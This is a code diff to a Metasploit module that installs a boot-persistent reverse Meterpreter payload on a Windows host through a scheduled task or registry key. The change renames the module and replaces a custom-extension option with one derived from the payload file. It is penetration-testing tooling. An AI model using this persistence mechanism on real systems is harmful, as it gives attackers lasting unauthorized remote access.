@@ -22,7 +22,7 @@ class Metasploit3 < Msf::Exploit::Local
 
   def initialize(info={})
     super( update_info( info,
-      'Name'          => 'Windows Manage Persistent Payload Installer-BT',
+      'Name'          => 'Windows Manage Persistent Payload Installer',
       'Description'   => %q{
         This Module will create a boot persistent reverse Meterpreter session by
         installing on the target host the payload as a script that will be executed
@@ -46,20 +46,18 @@ class Metasploit3 < Msf::Exploit::Local
       [
         OptInt.new('DELAY', [true, 'Delay in minutes for persistent payload to reconnect.', 2]),
         OptString.new('NAME', [true, 'Name of the scheduled task and registry key.', 'update-svc-msf']),
-        OptString.new('CustomExtension', [true, 'The extension of the Custom EXE file, could be a .bat file or .vbs', '.exe']),
         OptBool.new('UNINSTALL', [false, 'Set this option if the persistence is to be removed.']),
       ], self.class)
   end
 
   # Exploit Method for when exploit command is issued
-  # maybe make this a post module not exploit as only issue exe::custom and not start handler
 
   def exploit
     print_status("Running module against #{sysinfo['Computer']}")
     delay = datastore['DELAY']
     name = datastore['NAME']
     unin = datastore['UNINSTALL']
-    cusext = datastore['CustomExtension']
+    cusext = ::File.extname(datastore['EXE::Custom'])
     execus = datastore['EXE::Custom'].to_s
     host,port = session.session_host, session.session_port
 
